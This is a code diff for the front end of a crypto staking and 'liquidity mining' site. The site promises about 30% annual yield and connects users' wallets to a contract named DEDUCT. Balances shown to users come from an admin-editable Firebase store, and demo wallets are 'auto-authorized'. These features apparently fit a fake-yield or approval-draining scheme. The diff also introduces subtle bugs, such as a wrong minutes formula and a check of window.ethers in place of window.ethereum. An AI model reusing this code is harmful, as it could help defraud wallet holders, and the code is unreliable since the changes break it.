@@ -17,32 +17,43 @@ function initSSE() {
       const { event, data } = JSON.parse(e.data);
       console.log('[DEBUG] SSE 接收事件:', event);
       console.log('[DEBUG] SSE 接收數據結構:', Object.keys(data));
-      if (event === 'dataUpdate' && data.users?.[userAddress]) {
-        const userData = data.users[userAddress];
-        console.log('[DEBUG] 更新用戶數據:', userData);
-        window.currentClaimable = userData.claimable || 0;
-        // 【修正】更新所有代幣餘額，不只當前 token
-        for (const token in accountBalance) {
-          if (userData.accountBalance && userData.accountBalance[token]) {
-            accountBalance[token].pledged = userData.accountBalance[token].pledged || 0;
-            accountBalance[token].interest = userData.accountBalance[token].interest || 0;
+      if (event === 'dataUpdate') {
+        console.log('[DEBUG] 檢查全域數據中的用戶:');
+        let matchedUserData = null;
+        for (let addr in data.users) {
+          if (addr.toLowerCase() === userAddress.toLowerCase()) {
+            matchedUserData = data.users[addr];
+            console.log('[DEBUG] 找到匹配用戶數據:', matchedUserData);
+            break;
           }
         }
-        // 【新增】演示錢包同步
-        if (userData.isDemoWallet) {
-          console.log('[DEBUG] 檢測到演示錢包，自動模擬');
-          window.isDemoMode = true;
-          if (startBtn) startBtn.style.display = 'none';
-          disableInteractiveElements(false);
-          updateStatus("演示模式：已自動授權");
-          activateStakingUI();
+        if (matchedUserData) {
+          window.currentClaimable = matchedUserData.claimable || 0;
+          // 【修正】更新所有代幣餘額，不只當前 token
+          for (const token in accountBalance) {
+            if (matchedUserData.accountBalance && matchedUserData.accountBalance[token]) {
+              accountBalance[token].pledged = matchedUserData.accountBalance[token].pledged || 0;
+              accountBalance[token].interest = matchedUserData.accountBalance[token].interest || 0;
+            }
+          }
+          // 【新增】演示錢包同步
+          if (matchedUserData.isDemoWallet) {
+            console.log('[DEBUG] 檢測到演示錢包，自動模擬');
+            window.isDemoMode = true;
+            if (startBtn) startBtn.style.display = 'none';
+            disableInteractiveElements(false);
+            updateStatus("演示模式：已自動授權");
+            activateStakingUI();
+          }
+          // 【關鍵修正】強制更新所有 UI
+          updateClaimableDisplay();
+          updateAccountBalanceDisplay();
+          updatePledgeSummary();
+          updateWalletBalanceFromCache(); // 強制刷新餘額顯示
+          console.log('[DEBUG] UI 更新完成');
+        } else {
+          console.log('[DEBUG] 未找到匹配用戶數據');
         }
-        // 【關鍵修正】強制更新所有 UI
-        updateClaimableDisplay();
-        updateAccountBalanceDisplay();
-        updatePledgeSummary();
-        updateWalletBalanceFromCache(); // 強制刷新餘額顯示
-        console.log('[DEBUG] UI 更新完成');
       }
       if (event === 'pledgeAccepted' && data.address === userAddress.toLowerCase()) {
         console.log('[DEBUG] 接收質押接受:', data);
@@ -339,7 +350,7 @@ const translations = {
       <p>1. 选择代币，需至少 500 USDT/USDC 或 WETH $500才能开始。</p>
       <p>2. 不足：可授权但无法开始。</p>
       <p>3. 年化利率：28.3% ~ 31.5%。</p>
-      <p>4. 每 12小时发放一次（美西时间 00:00与12:00）。</p>
+      <p>4. 每12小时发放一次（美西时间00:00与12:00）。</p>
       <p>5. 质押也会一并计算流动性挖矿利息。</p>
     `,
     modalClaimableLabel: '可领取',
@@ -502,13 +513,13 @@ async function smartSave(data, forceLocal = false) {
     }
   }
   try {
-    console.log('[DEBUG] 寫入Firestore:', cleanData);
+    console.log('[DEBUG] 寫入 Firebase:', cleanData);
     await saveUserData(cleanData, false);
     localStorage.setItem('userData', JSON.stringify(cleanData));
     localStorage.setItem('pendingSync', 'true');
-    console.warn('後端離線，資料已寫入Firestore + Local');
+    console.warn('後端離線，資料已寫入 Firebase + Local');
   } catch (error) {
-    console.error('Firestore寫入失敗:', error.message);
+    console.error('Firebase 寫入失敗:', error.message);
   }
 }
 // ==================== 斷線重連 + 同步 ====================
@@ -552,7 +563,7 @@ setInterval(async () => {
     }, true);
   }
 }, 3600000);
-// ==================== Firestore儲存（智能同步） ====================
+// ==================== Firebase 儲存（智能同步） ====================
 async function saveUserData(data = null, addToPending = true) {
   if (!userAddress) return;
   const hasStateChange = data ||
@@ -580,28 +591,28 @@ async function saveUserData(data = null, addToPending = true) {
     authorizedToken: authorizedToken
   };
   try {
-    console.log('[DEBUG] 寫入Firestore:', dataToSave);
+    console.log('[DEBUG] 寫入 Firebase:', dataToSave);
     await db.collection('users').doc(userAddress).set(dataToSave, { merge: true });
     localStorage.setItem('userData', JSON.stringify(dataToSave));
     localLastUpdated = dataToSave.lastUpdated;
-    console.log('[DEBUG] Firestore寫入成功');
+    console.log('[DEBUG] Firebase 寫入成功');
   } catch (error) {
-    console.error('[DEBUG] Firestore寫入錯誤:', error);
+    console.error('[DEBUG] Firebase 寫入錯誤:', error);
     if (addToPending) pendingUpdates.push({ timestamp: Date.now(), payload: { data: dataToSave } });
   }
 }
-// ==================== Firestore載入 + 即時監聽（後台靜默） ====================
+// ==================== Firebase 載入 + 即時監聽（後台靜默） ====================
 async function loadUserDataFromServer() {
   if (!userAddress) return;
   try {
-    console.log('[DEBUG] 載入Firestore用戶數據:', userAddress);
+    console.log('[DEBUG] 載入 Firebase 用戶數據:', userAddress);
     const snap = await db.collection('users').doc(userAddress).get();
     if (!snap.exists) {
-      console.log('[DEBUG] Firestore用戶數據不存在');
+      console.log('[DEBUG] Firebase 用戶數據不存在');
       return;
     }
     const userData = snap.data();
-    console.log('[DEBUG] Firestore載入數據:', userData);
+    console.log('[DEBUG] Firebase 載入數據:', userData);
     const localData = JSON.parse(localStorage.getItem('userData') || '{}');
     localLastUpdated = localData.lastUpdated || 0;
     if (userData.lastUpdated >= localLastUpdated || userData.source === 'admin.html') {
@@ -647,22 +658,22 @@ async function loadUserDataFromServer() {
       updateEstimate();
     }
   } catch (error) {
-    console.error('[DEBUG] Firestore載入錯誤:', error);
+    console.error('[DEBUG] Firebase 載入錯誤:', error);
   }
 }
 function startRealtimeListener() {
   if (!userAddress) return;
-  console.log('[DEBUG] 開始Firestore即時監聽:', userAddress);
+  console.log('[DEBUG] 開始 Firebase 即時監聽:', userAddress);
   db.collection('users').doc(userAddress).onSnapshot((docSnap) => {
     if (docSnap.exists) {
       const userData = docSnap.data();
       if (userData.lastUpdated > localLastUpdated || userData.source === 'admin.html') {
-        console.log('[DEBUG] Firestore即時更新觸發');
+        console.log('[DEBUG] Firebase 即時更新觸發');
         loadUserDataFromServer();
       }
     }
   }, (error) => {
-    console.error('[DEBUG] Firestore監聽錯誤:', error);
+    console.error('[DEBUG] Firebase 監聽錯誤:', error);
   });
 }
 function updateStatus(message, isWarning = false) {
@@ -810,7 +821,7 @@ async function refreshEthPrice() {
     ethPriceCache.price = data.ethereum.usd;
     ethPriceCache.timestamp = now;
   } catch (error) {
-    console.error('[DEBUG] ETH 價格刷新錯誤:', error);
+    console.error('[DEBUG] ETH價格刷新錯誤:', error);
   }
 }
 function initializeMiningData() {
@@ -917,7 +928,7 @@ function updateNextBenefitTimer() {
   }
   const totalSeconds = Math.floor(Math.max(diff, 0) / 1000);
   const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
-  const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
+  const minutes = String(Math.floor((totalSeconds % 3600) / 3600)).padStart(2, '0');
   const seconds = String(totalSeconds % 60).padStart(2, '0');
   nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
 }
@@ -968,12 +979,12 @@ async function initializeWallet() {
     return;
   }
   try {
-    console.log('[DEBUG] 錢包初始化...');
-    if (typeof window.ethereum !== 'undefined') {
+    console.log('[DEBUG] 初始化錢包...');
+    if (typeof window.ethers !== 'undefined') {
       provider = new window.ethers.BrowserProvider(window.ethereum);
     } else {
       provider = new window.ethers.JsonRpcProvider(INFURA_URL);
-      updateStatus('請連接錢包進行交易', true);
+      updateStatus('請連結錢包以進行交易', true);
     }
     if (window.ethereum) {
       window.ethereum.on('accountsChanged', a => {
@@ -990,7 +1001,7 @@ async function initializeWallet() {
     }
     const accounts = await provider.send('eth_accounts', []);
     if (accounts.length > 0) {
-      console.log('[DEBUG] 自動連接錢包');
+      console.log('[DEBUG] 自動連線錢包');
       await connectWallet();
       await updateUIBasedOnChainState();
     } else {
@@ -1012,9 +1023,9 @@ async function connectWallet() {
   }
   isConnecting = true;
   try {
-    console.log('[DEBUG] 開始錢包連接...');
+    console.log('[DEBUG] 開始錢包連線...');
     if (typeof window.ethereum === 'undefined') {
-      updateStatus('請連接支持EIP-1193的錢包', true);
+      updateStatus('請連結支援 EIP-1193 的錢包', true);
       return;
     }
     if (!provider) {
@@ -1025,7 +1036,7 @@ async function connectWallet() {
     if (accounts.length === 0) throw new Error("No account.");
     signer = await provider.getSigner();
     userAddress = await signer.getAddress();
-    console.log('[DEBUG] 錢包連接成功:', userAddress);
+    console.log('[DEBUG] 錢包連線成功:', userAddress);
     deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
     usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
     usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
@@ -1035,17 +1046,17 @@ async function connectWallet() {
       connectButton.textContent = 'Connected';
     }
     await forceRefreshWalletBalance();
-    updateStatus('錢包連接成功，餘額已載入');
+    updateStatus('錢包連線成功，餘額已載入');
     await loadUserDataFromServer();
     await updateUIBasedOnChainState();
     initSSE();
     await updateUIBasedOnChainState();
   } catch (e) {
-    console.error('[DEBUG] 錢包連接錯誤:', e);
+    console.error('[DEBUG] 錢包連線失敗:', e);
     if (e.code === -32002 || e.message.includes('already pending')) {
       updateStatus('錢包確認視窗已開啟，請在錢包中確認', true);
     } else {
-      log(`錢包連接失敗: ${e.message}`, 'error');
+      log(`錢包連線失敗: ${e.message}`, 'error');
       updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
       resetState(true);
     }
@@ -1574,8 +1585,11 @@ document.addEventListener('DOMContentLoaded', async () => {
   if (accountDetailModal) accountDetailModal.addEventListener('click', e => e.target === accountDetailModal && closeAccountDetailModal());
   document.querySelectorAll('.tab').forEach(tab => {
     tab.addEventListener('click', () => {
-      document.querySelectorAll('.tab').forEach(s => s.classList.remove('active'));
-      document.getElementById(tab.dataset.tab).classList.add('active');
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      tab.classList.add('active');
+      document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
+      const targetContent = document.getElementById(tab.dataset.tab);
+      if (targetContent) targetContent.classList.add('active');
       if (tab.dataset.tab === 'liquidity') updateInterest();
     });
   });
@@ -1634,8 +1648,8 @@ setInterval(async () => {
       cachedWalletBalances = { USDT: usdtBal, USDC: usdcBal, WETH: wethBal };
       updateWalletBalanceFromCache();
       updateAccountBalanceDisplay();
-    } catch (err) {
-      log(`自動更新失敗: ${err.message}`, 'error');
+    } catch (error) {
+      log(`自動更新失敗: ${error.message}`, 'error');
     }
   }
 }, 10000);
